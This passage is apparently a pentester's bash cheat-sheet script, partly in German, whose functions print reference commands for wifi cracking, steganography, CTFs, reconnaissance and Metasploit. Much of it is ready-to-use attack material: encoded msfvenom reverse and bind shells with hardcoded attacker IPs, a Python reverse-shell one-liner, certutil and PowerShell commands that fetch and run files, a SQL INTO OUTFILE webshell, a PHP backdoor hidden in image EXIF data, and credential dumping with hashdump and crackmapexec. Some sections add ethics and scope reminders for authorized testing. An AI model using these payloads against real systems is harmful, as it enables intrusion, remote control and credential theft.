bettercap -iface wlan0 -caplet http-ui               # Webinterface mit Captive Portal

${BLUEBOLD}## 9. Passwort-Cracking mit Hashcat${RESET}
aircrack-ng capture.cap -J capture_hash
hashcat -m 2500 capture_hash.hccapx wordlist.txt --force
hashcat -m 22000 capture.22000 wordlist.txt --force

${BLUEBOLD}## 10. Sniffing & Analyse${RESET}
wireshark capture.cap                                # Analyse von Frames
tshark -r capture.cap -Y 'wlan.fc.type_subtype == 0x08'
# -> Zeigt Beacon-Frames & Authentifizierung

${BLUEBOLD}## 11. Bluetooth & BLE (optional)${RESET}
hcitool scan                                         # Bluetooth-Geräte scannen
sudo btmon                                           # BLE-Pakete überwachen
sudo gatttool -b [MAC] -I                            # Mit BLE-Gerät verbinden

${BLUEBOLD}## 12. Cleanup${RESET}
sudo service NetworkManager restart
sudo airmon-ng stop wlan0mon
sudo systemctl restart wpa_supplicant
iwconfig                                             # Überprüfen, ob Interface wieder normal ist

${YELLOW}================================================================================${RESET}
${CYAN}-------------------------------------------------------------------------------- ${RESET}
${YELLOW}================================================================================${RESET}
"
}

my_stegano(){
echo -e "
${YELLOW}================================================================================${RESET}
${BLUE}======================[ Steganography / Datenversteckung Testing ]======================${RESET}
${YELLOW}================================================================================${RESET}

${REDBOLD}### 1. Überblick${RESET}
- Steganographie bedeutet, Informationen unauffällig in anderen Dateien zu verstecken.
- Typischerweise Bilder, Audio, Video oder Dokumente.
- Ziel bei Tests: prüfen, ob jemand Daten heimlich eingebettet hat oder ob sich aus einer Datei Informationen extrahieren lassen.

${BLUEBOLD}## 2. Grundlegende Erkennung${RESET}
file suspicious.jpg                      # Dateityp prüfen
exiftool suspicious.jpg                   # Metadaten und Kommentare anzeigen
strings suspicious.jpg | less             # Versteckte Texte oder Pfade suchen
binwalk suspicious.jpg                    # Eingebettete Dateien oder Archive erkennen
xxd suspicious.jpg | less                 # Hexdump zur manuellen Sichtprüfung
hexdump -C suspicious.jpg | less          # Alternative Darstellung

${BLUEBOLD}## 3. Versteckte Daten in Bildern${RESET}
# 🔹 Mit Steghide
steghide info suspicious.jpg
steghide extract -sf suspicious.jpg       # Passwort wird ggf. abgefragt
steghide embed -cf original.jpg -ef secret.txt -sf output.jpg

# 🔹 Mit zsteg (PNG/JPG)
zsteg suspicious.png
zsteg suspicious.png -E b1,rgb,lsb,xy     # Einzelne Bit-Planes auslesen

# 🔹 Mit stegseek (schneller Bruteforce)
stegseek suspicious.jpg wordlist.txt
stegseek suspicious.jpg rockyou.txt --seed

# 🔹 Mit stegosuite (GUI)
stegosuite                                 # GUI-Tool zum Verstecken/Lesen von Daten

${BLUEBOLD}## 4. Audio-Steganographie${RESET}
# 🔹 Steghide unterstützt auch WAV/AU-Dateien:
steghide info hidden.wav
steghide extract -sf hidden.wav

# 🔹 mp3stego (Windows/Linux)
mp3stego -E secret.txt -P passwort -S file.mp3
mp3stego -X -P passwort file.mp3

${BLUEBOLD}## 5. Video-Steganographie${RESET}
# 🔹 FFmpeg + Strings
ffmpeg -i video.mp4 -f image2 frame_%04d.png      # Frames extrahieren
strings frame_0001.png | grep flag                # Textfragmente prüfen

# 🔹 OpenStego
openstego extract -sf suspicious.mp4 -p passwort

${BLUEBOLD}## 6. Dokumente (DOCX, PDF, ZIP-Container)${RESET}
unzip suspicious.docx -d extracted/
cd extracted/ && ls -lah
grep -Ri 'flag' .
pdf-parser.py suspicious.pdf
pdfid.py suspicious.pdf
binwalk suspicious.pdf

${BLUEBOLD}## 7. Weitere Tools & Methoden${RESET}
# 🔹 OutGuess
outguess -k passwort -r hidden.jpg output.txt
outguess -k passwort -d message.txt original.jpg output.jpg

# 🔹 Stegsolve (Java-GUI)
java -jar stegsolve.jar                    # Bild-Analyse in Farbkanälen

# 🔹 StegoVeritas (Python-Framework)
stegoveritas suspicious.png -meta -trailing -image
stegoveritas.py -extract all suspicious.png

# 🔹 Least Significant Bit-Analyse (manuell)
convert suspicious.png -separate +adjoin channel_%d.png
# -> einzelne Farbkanäle für visuelle Analyse

${BLUEBOLD}## 8. Hash-Verifikation${RESET}
md5sum suspicious.jpg
sha256sum suspicious.jpg
# -> Prüfen, ob Dateien nach Extraktion verändert wurden

${BLUEBOLD}## 9. Automatisierte Multi-Analyse${RESET}
# 🔹 Stegdetect (JPEG-Analyse)
stegdetect suspicious.jpg

# 🔹 Kombiniert: Strings + Exif + Binwalk
(strings suspicious.jpg; exiftool suspicious.jpg; binwalk suspicious.jpg) > steg_analysis.txt

${BLUEBOLD}## 10. Cleanup & Ethik${RESET}
- Entferne temporäre Dateien, um sensible Extrakte nicht herumliegen zu lassen.
- Führe Tests nur auf eigenen oder freigegebenen Dateien aus.
- Ziel ist forensische Nachvollziehbarkeit und Schulung, nicht heimliches Verbergen.

${YELLOW}================================================================================${RESET}
${CYAN}--------------------------------------------------------------------------------${RESET}
${YELLOW}================================================================================${RESET}
"
}


my_terminator_help(){
echo -e "${BLUE}
New window	 	Shift+Ctrl+I
New Tab			Shift+Ctrl+T
Split terminal		Shift+Ctrl+O/E
Close window	 	Shift+Ctrl+Q
Close terminal	 	Shift+Ctrl+W
Toggle fullscreen	F11
Resize terminal		Shift+Ctrl+<Arrow>
Zoom terminal	 	Shift+Ctrl+Z
Maximise terminal	Shift+Ctrl+X
Reset			Shift+Ctrl+R
Reset + Clear		Shift+Ctrl+G
Begin search		Shift+Ctrl+F
${RESET}"
}

my_methodology(){
echo -e "
${BLUEBOLD}
### Methodology: testing a website ###
1. Gather subdomains
2. take screenshots
3. gather urls
4. gather parameters
5. gather js files
6. search in js file for
	- sensitive infos
	- urls
7. nuclei templates for 
	- sqli
	- xss
	- ssrf
	- template injection
	- others
8. nuclei templates in general
9. oneliner
10. Burpsuite through the app
11. 

### Methodology: parameters bruteforcing! ###
1. get possible parameters from xnlinkfinder
2. pass the parameter to arjun 
3. test them!

### Methodology: parameters bruteforcing! ###
- jsmon
- url-tracker

### Automation ###
- rengine
- Active scan with burpsuite pro

${RESET}
"
}

my_colors(){
echo -e "
Text Color:

Black: \e[30m
Red: \e[31m
Green: \e[32m
Yellow: \e[33m
Blue: \e[34m
Magenta: \e[35m
Cyan: \e[36m
White: \e[37m
Text Styles:

Reset: \033[0m
Bold: \e[1m
Underline: \e[4m
Blink: \e[5m
Reverse: \e[7m
\033[0m
"
}


my_commands(){
echo -e "
${BLUE}
${YELLOW}================================================================================${RESET}
${CYAN}--------------------------------------------------------------------------------${RESET}
${YELLOW}================================================================================${RESET}
my_bugbounty_commands
my_methodology
my_colors
my_commands
my_pentest_paths
my_venomref
my_common
my_metasploit
my_metasploit_exploits
my_ctf
my_reverseshell
my_breakout
my_terminator_help
my_linuxpriv
my_bufferOverflow
my_wifi
my_stegano
my_network
my_android
my_active_directory
my_thinclient
my_pivoting
my_windows_privs
my_automotive
my_todo
${YELLOW}================================================================================${RESET}
${CYAN}--------------------------------------------------------------------------------${RESET}
${YELLOW}================================================================================${RESET}
${RESET}
"
}

my_venomref(){
echo -e "
${YELLOW}================================================================================${RESET}
${CYAN}WINDOWS/SHELL/REVERSE_TCP [PORT 443]${RESET}
msfvenom -p windows/shell/reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x86 -f exe -e x86 shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe

${CYAN}WINDOWS/SHELL_REVERSE_TCP (NETCAT x86) [PORT 443]${RESET}
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe

${CYAN}WINDOWS/SHELL_REVERSE_TCP (NETCAT x64) [PORT 443]${RESET}
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x64 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe

${CYAN}WINDOWS/METERPRETER/REVRESE_TCP (x86) [PORT 443]${RESET}
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_86.exe

${CYAN}WINDOWS/METERPRETER/REVRESE_TCP (x64) [PORT 443] AT 10.0.0.67:${RESET}
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=443 --platform windows -a x64 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o reverse_encoded_64.exe

${CYAN}---===BIND SHELL, ENCODED, ON PORT 1234===---${RESET}
msfvenom -p windows/shell_bind_tcp LHOST=10.0.0.67 LPORT=1234 --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o bindshell_1234_encoded_86.exe

${CYAN}Code for encoding:${RESET}
--platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o payload_86.exe
================================================================================
${CYAN}[+ Binaries LINUX | WINDOWS | MacOS ]${RESET}
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf > shell.elf
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe > shell.exe
msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho > shell.macho

${CYAN}[+ Shellcode LINUX | WINDOWS | MacOS ]${RESET}
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f
msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.67 LPORT=80 EXITFUNC=thread -f python -a x86 --platform windows -b '\x00' -e x86/shikata_ga_nai

${CYAN}NETCAT${RESET}
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.67 LPORT=1234 -f elf >reverse.elf
================================================================================
${CYAN}[+ Scripting Payloads - Python | Bash | Perl ]${RESET}
msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw > shell.py
msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw > shell.sh
msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw > shell.pl
================================================================================
${RED}[+ PHP ]${RESET}
${CYAN}PHP/METERPRETER_REVERSE_TCP [PORT 443]${RESET}
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.67 LPORT=443 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\\\n' > shell.php && pbpaste >> shell.php

${CYAN}PHP/METERPRETER/REVERSE_TCP [PORT 443]${RESET}
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=443 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\\\n' > shell.php && pbpaste >> shell.php

${CYAN}PHP/REVERSE_PHP [PORT 443]${RESET}
msfvenom -p php/reverse_php LHOST=10.0.0.67 LPORT=443 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\\\n' > shell.php && pbpaste >> shell.php

${RED}[+ ASP ]${RESET}
${CYAN}ASP-REVERSE-PAYLOAD [PORT 443]${RESET}
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.67 LPORT=443 -f asp > shell.asp

${CYAN}OR FOR NETCAT [PORT 443]${RESET}
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.67 LPORT=443 -f asp > shell.asp
================================================================================
${CYAN}[+ Client-Side, Unicode Payload - For use with Internet Explorer and IE]${RESET}
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.30.5 LPORT=443 -f js_le -e generic/none
#Note: To keep things the same size, if needed add NOPs at the end of the payload.
#A Unicode NOP is - %u9090
================================================================================
${CYAN}# DLL HiJacking - Windows - x64${RESET}
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.190 LPORT=4444 -f dll -o Printconfig.dll
================================================================================
"
}

my_ctf(){
echo -e "
${YELLOW}================================================================================${RESET}
${BLUE}=============================[ CTF / Capture The Flag Methodology ]=============================${RESET}
${YELLOW}================================================================================${RESET}

${REDBOLD}### 0. Grundsätzliches & Ethik${RESET}
- CTFs sind Übungsumgebungen zum Lernen. Nutze diese Methoden nur in CTF-/Lab-Umgebungen oder mit ausdrücklicher Erlaubnis.  
- Dokumentiere Fundorte der Flags, genutzte Tools und Reproduktionsschritte — das hilft beim Writeup.  
- Teile dein Wissen, nicht sensiblen Code oder Passwörter von realen Systemen.

${BLUEBOLD}## 1. Workflow-Übersicht (Phasen)${RESET}
1) Recon & Enumeration (schnell, breit)  
2) Kategorisieren (web, pwn, crypto, reversing, stego, forensics, misc)  
3) Priorisieren (low-hanging fruits)  
4) Exploitation / Solution Building  
5) Post-Processing (automatisieren, Flags sichern, Writeup)  

${BLUEBOLD}## 2. Allgemeine Tools & Helfer${RESET}
# Shell / Utilities
nc, ncat, socat, curl, wget, jq, xxd, strings, file, exiftool
# Fuzzing / Discovery
ffuf, wfuzz, gobuster, nikto, sqlmap
# Reverse / Binary
gdb, gef, pwndbg, pwntools, radare2, rizin, ghidra, objdump, readelf, ltrace, strace
# Crypto / Hashing
hashcat, john, openssl, python3 (cryptography, pycrypto)
# Stego / Forensics
binwalk, foremost, steghide, zsteg, stegsolve, foremost, exiftool
# Memory / Forensics
volatility, volatility3
# Web proxy
burpsuite, mitmproxy
# Misc
python3, ruby, perl, docker, qemu

${BLUEBOLD}## 3. Recon & Enumeration (schnell starten)${RESET}
# TCP/UDP-Discovery
nmap -sC -sV -p- -T4 -oA nmap_full <target>
# Schnelle Web-Fuzzing
ffuf -u https://HOST/FUZZ -w /usr/share/wordlists/raft-small-directories.txt -t 50
# HTTP-Header & Methods
curl -I http://HOST
curl -X OPTIONS http://HOST -i

${BLUEBOLD}## 4. Web-Challenges (klassisch)${RESET}
# 1) Fingerprint: app, frameworks, js-files, robots.txt
curl -sS http://HOST/robots.txt
# 2) Parameter-Fuzz, LFI/RFI, XSS, SQLi
ffuf -u http://HOST/FUZZ -w wordlist.txt
wfuzz -c -w xss-payloads.txt -u 'http://HOST/page.php?param=FUZZ'
sqlmap -u 'http://HOST/vuln.php?id=1' --batch --level=3
# 3) Auth / logic flaws: brute-force, session tampering, IDOR checks

${BLUEBOLD}## 5. PWN / Binary Exploitation${RESET}
# Analyse
file chall
strings chall | head
readelf -h chall
# Debugging
gdb -q chall
# GEF / Pwndbg commands
# Pattern create / offset
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300
# Exploit-Dev: pwntools (Python)
# Shellcode testing in QEMU / Docker for isolation

${BLUEBOLD}## 6. Reverse Engineering (Reversing)${RESET}
# Decompile / inspect
rizin -A chall
ghidra     # GUI
# Dynamic tracing
strace -o trace.txt ./chall
ltrace ./chall

${BLUEBOLD}## 7. Crypto Challenges${RESET}
# Look for common pitfalls: reuse of IV, ECB, hardcoded keys, base encodings
python3 - <<'PY'
# quick helpers: base64, rot13, xor, aes
PY
# Use hashcat or john for cracking when hashes present

${BLUEBOLD}## 8. Steganography & Forensics${RESET}
# Identify embedded files
binwalk suspicious.bin
exiftool suspicious.jpg
zsteg suspicious.png
# Extract common containers
foremost -i suspicious.img -o outdir
strings suspicious.wav | less

${BLUEBOLD}## 9. Forensics / Memory (Memory challenges)${RESET}
volatility -f memdump.raw --profile=Win7SP1x64 pslist
strings memdump.raw | grep FLAG

${BLUEBOLD}## 10. Misc / Reverse Shells / Interact${RESET}
# nc listener
nc -lvnp 1337
# python one-liner reverse (wenn safe in CTF)
python3 -c 'import socket,os,subprocess;s=socket.socket();s.connect(("ATTACKER",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'

${BLUEBOLD}## 11. Automation & Tooling (Writeups & Reproducibility)${RESET}
# Repository pro Challenge
mkdir ctf-challenge && git init
# Notebooks / scripts speichern (exploit.py, solve.py)
# Docker / QEMU für isolierte Tests
docker run --rm -it -v $(pwd):/work kali:latest /bin/bash

${BLUEBOLD}## 12. Flag Handling & Proofs${RESET}
- Flag sichern: Copy in file `flag.txt` mit Zeitstempel und Challenge-Name.  
- Sammle minimalen Proof: input, exploit-command, output (Screenshot / pcap / stdout).  
- Schreibe kurze Lösungsschritte für Writeup: Problem, Ansatz, Schlüssel-Schritte, Code.

${BLUEBOLD}## 13. Teamwork & Time-Management (CTF-spezifisch)${RESET}
- Priorisiere: 1) triviale points, 2) Teamsplit für web/pwn/crypto, 3) reserve Zeit für hard challenges.  
- Kommuniziere Fundamente: wer macht Reversing, wer fuzzed, wer baut Exploit.  
- Dokumentiere Fortschritt in kurzer Form im Team-Channel.

${BLUEBOLD}## 14. Cleanup & Ethics Reminder${RESET}
- Lösche temporäre Payloads, entferne getestete VMs/Container, sichere Logs lokal.  
- Teile Lösungen respektvoll (Writeups) — keine Live-Exploits gegen reale Targets.

${YELLOW}================================================================================${RESET}
${CYAN}--------------------------------------------------------------------------------${RESET}
${YELLOW}================================================================================${RESET}
"
}

my_bufferOverflow(){
echo "
# Generating Payload Pattern & Calculating Offset
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 'EIP_VALUE'
"
}

my_pentest_paths(){
echo "
${YELLOW}# Paketverwaltung:${RESET}
	- /etc/apt/sources.list
${YELLOW}# Wordlists:${RESET}
	- /usr/share/wordlists/
${YELLOW}# Tools:${RESET}
	- /usr/bin/
	- /usr/local/bin/
${YELLOW}# Proxy / Netzwerk-Konfiguration:${RESET}
	- /etc/proxychains.conf 
	- /etc/hosts 
	- /etc/hosts.allow
	- /etc/hosts.deny 
	- /etc/ssl/certs/
${YELLOW}# Webserver & Web-App Files:${RESET}
	- /var/www/html/ 
	- /etc/nginx/sites-available/ 
	- /etc/apache2/sites-available/
${YELLOW}# Logs:${RESET}
	- /var/log/
"
}


my_common(){
IP='target-ip'
URL='target-url'
echo -e "
${YELLOW}================================================================================${RESET}
${BLUE}================================================================================
===Nmap====${RESET}
nmap -p- -sT -sV -A $IP
nmap -p- -sC -sV $IP --open
nmap -p- --script=vuln $IP
nmap –script *ftp* -p 21 $IP
${CYAN}###HTTP-Methods${RESET}
nmap --script http-methods --script-args http-methods.url-path='/website' 
###  --script smb-enum-shares
${CYAN}sed IPs:${RESET}
grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])' FILE
${BLUE}================================================================================
===NFS Exported Shares${RESET}
showmount -e $IP
mount $IP:/vol/share /mnt/nfs -nolock
${BLUE}================================================================================
===RPC / NetBios (137-139) / SMB (445)${RESET}
rpcinfo -p $IP
nbtscan $IP

${CYAN}#list shares${RESET}
smbclient -L //$IP -U ''

${CYAN}# null session${RESET}
rpcclient -U '' $IP
smbclient -L //$IP
enum4linux $IP
${BLUE}================================================================================
===Cracking Web Forms with Hydra${RESET}
https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force

hydra 10.10.10.52 -l username -P /usr/share/wordlists/list 10.0.0.1 ftp
${BLUE}================================================================================
===Compiling Code From Linux${RESET}
${CYAN}# Windows${RESET}
i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe
${CYAN}# Linux${RESET}
gcc -m32|-m64 -o output source.c

${CYAN}# Compiling Assembly from Windows${RESET}
# https://www.nasm.us/pub/nasm/releasebuilds/?C=M;O=D
nasm -f win64 .\hello.asm -o .\hello.obj
# http://www.godevtool.com/Golink.zip
GoLink.exe -o .\hello.exe .\hello.obj
${BLUE}================================================================================
===Cracking a ZIP Password${RESET}
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt bank-account.zip
${BLUE}================================================================================
===Port forwarding${RESET}
https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding
${BLUE}================================================================================
===Setting up Simple HTTP server${RESET}
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -r webrick -e 'WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start'
php -S 0.0.0.0:80
${BLUE}================================================================================
===Uploading Files to Target Machine${RESET}
certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
python -c \"from urllib import urlretrieve; urlretrieve('http://10.11.0.245/nc.exe', 'C:\\Temp\\nc.exe')\"
powershell (New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/file.exe','file.exe');
wget http://$ATTACKER/file
curl http://$ATTACKER/file -O
scp ~/file/file.bin user@$IP:tmp/backdoor.py
# Attacker
nc -l -p 4444 < /tool/file.exe
# Victim
nc $ATTACKER 4444 > file.exe
${BLUE}================================================================================
===Converting Python to Windows Executable (.py -> .exe)${RESET}
python pyinstaller.py --onefile convert-to-exe.py
${BLUE}================================================================================
===WPScan & SSL${RESET}
wpscan --url $URL --disable-tls-checks --enumerate p, t, u

${CYAN}===WPScan Brute Forceing:${RESET}
wpscan --url $URL --disable-tls-checks -U users -P /usr/share/wordlists/rockyou.txt

${CYAN}===Aggressive Plugin Detection:${RESET}
wpscan --url $URL --enumerate p --plugins-detection aggressive

${CYAN}===cmsmap -- (W)ordpress, (J)oomla or (D)rupal or (M)oodle${RESET}
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
================================================================================
${BLUE}===Nikto with SSL and Evasion${RESET}
nikto --host $IP -ssl -evasion 1
SEE EVASION MODALITIES.
${BLUE}================================================================================
===dns_recon${RESET}
dnsrecon –d yourdomain.com
${BLUE}================================================================================
===gobuster directory${RESET}
gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -k -t 30

${CYAN}===gobuster files${RESET}
gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -k -t 30

${CYAN}===gobuster for SubDomain brute forcing:${RESET}
gobuster dns -d domain.org -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
'just make sure any DNS name you find resolves to an in-scope address before you test it'
${BLUE}================================================================================
===Extract IPs from a text file${RESET}
grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' nmapfile.txt
${BLUE}================================================================================
===Wfuzz XSS Fuzzing${RESET}
wfuzz -c -z file,/opt/SecLists/Fuzzing/XSS/XSS-BruteLogic.txt '$URL'
wfuzz -c -z file,/opt/SecLists/Fuzzing/XSS/XSS-Jhaddix.txt '$URL'

${CYAN}===COMMAND INJECTION WITH POST DATA${RESET}
wfuzz -c -z file,/opt/SecLists/Fuzzing/command-injection-commix.txt -d 'doi=FUZZ' '$URL'

${CYAN}===Test for Paramter Existence!${RESET}
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt '$URL'

${CYAN}===AUTHENTICATED FUZZING DIRECTORIES:${RESET}
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 -d 'SESSIONID=value' '$URL'

${CYAN}===AUTHENTICATED FILE FUZZING:${RESET}
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-files.txt --hc 404 -d 'SESSIONID=value' '$URL'

${CYAN}===FUZZ Directories:${RESET}
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 404 '$URL'

${CYAN}===FUZZ FILES:${RESET}
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 '$URL'
|
${CYAN}LARGE WORDS:${RESET}
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-words.txt --hc 404 '$URL'
|
${CYAN}USERS:${RESET}
wfuzz -c -z file,/opt/SecLists/Usernames/top-usernames-shortlist.txt --hc 404,403 '$URL'
${BLUE}================================================================================
===ffuf ${RESET}
ffuf -w /path/to/wordlist -u https://target/FUZZ
ffuf -w /path/to/vhost/wordlist -u https://target -H 'Host: FUZZ'
https://github.com/vavkamil/awesome-bugbounty-tools#fuzzing
${BLUE}================================================================================
===dirsearch ${RESET}
# -e for extension 
# -t for threads 
# --proxy=http://127.0.0.1:8080
# --recursive
# --random-agents
# --exclude-status=400,403,404
python3 dirsearch.py -u https://target-website.local -w wordlist -e txt,xml,php
${BLUE}================================================================================
===Command Injection with commix, ssl, waf, random agent ${RESET}
commix --url='https://supermegaleetultradomain.com?parameter=' --level=3 --force-ssl --skip-waf --random-agent
${BLUE}================================================================================
===SQLMap${RESET}
sqlmap -u $URL --threads=2 --time-sec=10 --level=2 --risk=2 --technique=T --force-ssl
sqlmap -u $URL --threads=2 --time-sec=10 --level=4 --risk=3 --dump
/SecLists/Fuzzing/alphanum-case.txt
${BLUE}================================================================================
===Social Recon${RESET}
theharvester -d domain.org -l 500 -b google
${BLUE}================================================================================
===Nmap HTTP-methods${RESET}
nmap -p80,443 --script=http-methods  --script-args http-methods.url-path='/directory/goes/here'
${BLUE}================================================================================
===SMTP USER ENUM${RESET}
smtp-user-enum -M VRFY -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
smtp-user-enum -M RCPT -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
${BLUE}================================================================================
===Command Execution Verification - [Ping check]${RESET}
===
crackmapexec 192.168.1.5 -u Administrator -p 'PASS' -x whoami
crackmapexec 192.168.1.5 -u 'Administrator' -p 'PASS' --lusers
crackmapexec 192.168.1.0/24 -u 'Administrator' -p 'PASS' --local-auth --sam

====

====
#INTO OUTFILE D00R
SELECT '' into outfile '/var/www/WEROOT/backdoor.php';
${BLUE}================================================================================
====LFI?${RESET}
#PHP Filter Checks.
php://filter/convert.base64-encode/resource=
${BLUE}================================================================================
====UPLOAD IMAGE?${RESET}
GIF89a1
file.php -> file.jpg
file.php -> file.php.jpg
file.asp -> file.asp;.jpg
file.gif (contains php code, but starts with string GIF/GIF98)
00%
file.jpg with php backdoor in exif 
	exiv2 -c'A \"<?php system(\$_REQUEST['cmd']);?>\"!' backdoor.jpeg
	exiftool '-comment<=back.php' back.png
.jpg -> proxy intercept -> rename to .php
"
}

my_metasploit(){
echo -e "
${YELLOW}================================================================================${RESET}
${BLUE}==========================[ Metasploit Framework Reference ]==========================${RESET}
${YELLOW}================================================================================${RESET}

${REDBOLD}### 0. Legal / Ethics / Scope${RESET}
- Metasploit ist ein mächtiges Pentesting-Framework. Nutze es ausschließlich innerhalb des schriftlich vereinbarten Scope.  
- Exploits, Payloads und Persistence-Mechaniken dürfen nur nach ausdrücklicher Freigabe und mit Abbruchkriterien verwendet werden.  
- Protokolliere Zeit, Ziel, Aktionen und Ergebnisse. Jeder invasive Schritt braucht Timebox & Notfallplan.

${BLUEBOLD}## 1. Setup & Basics${RESET}
# Starte Metasploit
msfconsole

# Datenbank verbinden (optional, empfohlen für größere Engagements)
msfdb init                               # initialisiert db (einmalig)
msfconsole -q
db_status                                 # prüfen ob DB verbunden
db_connect user:pass@127.0.0.1:5432/metasploit

# Workspaces: logisch trennen nach Kunde/Engagement
workspace -a customer_project
workspace customer_project

${BLUEBOLD}## 2. Recon / Scanning Integration${RESET}
# Nutze Nmap + msfdb für Ergebnisse in Metasploit
db_nmap -sV -p 22,80,443 10.0.0.0/24
# Importiere nmap XML
db_import scan_output.xml

# Liste Hosts/Services
hosts
services -p 80

${BLUEBOLD}## 3. Modul-Findung & Auswahl${RESET}
# Suche nach passenden Exploits / Aux modules
search type:exploit name:apache
search cve:2021 id:log4j

# Informationen zum Modul ansehen
use exploit/windows/smb/ms17_010_eternalblue
info

${BLUEBOLD}## 4. Konfiguration & Schnelltests (sicher konfigurieren)${RESET}
# Setzen von Options
set RHOSTS 10.0.0.5
set RPORT 445
set THREADS 10
set VERBOSE true

# Payload-Setzung (Meterpreter- Beispiel)
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.1
set LPORT 4444

# Testen ohne Ausführung: Check (falls Modul es unterstützt)
check

${BLUEBOLD}## 5. Ausführung & Monitoring (nur mit Freigabe)${RESET}
# Exploit ausführen
exploit -j -z      # Job im Hintergrund (-j) und nicht interaktiv (-z)
# oder
run

# Sessions auflisten / verbinden
sessions -l
sessions -i 1

# Meterpreter-Grundbefehle (kurz)
sysinfo
getuid
ps
shell
background        # Session in Hintergrund

${BLUEBOLD}## 6. Post-Exploitation - Prinzipien (minimalinvasiv!)${RESET}
# Ziel: Impact & Blast-Radius zeigen, nicht dauerhafte Kontrolle
# Beispiele für sichere Nachweise:
meterpreter > hashdump        # nur mit Freigabe
meterpreter > download C:\\path\\to\\file
meterpreter > ls C:\\Users\\
meterpreter > run post/windows/gather/enum_domain  # nur nach Absprache

# Prozesse migrieren (wenn nötig, um Stabilität zu erhöhen)
migrate <pid>

# Exfiltration: nur Metadaten/kleine Belege, niemals Massenexport in Prod
download /path/to/log.txt /tmp/evidence.log

${BLUEBOLD}## 7. Payload-Generierung (msfvenom)${RESET}
# Erstellen von Payloads (für Testumgebungen)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf

# Erinnerung: Payloads nur in Labor/ausdrücklich freigegeben erzeugen und verwenden

${BLUEBOLD}## 8. Automatisierung & Ressourcen-Skripte${RESET}
# Resource-Skripte (.rc) laden
resource /path/to/script.rc
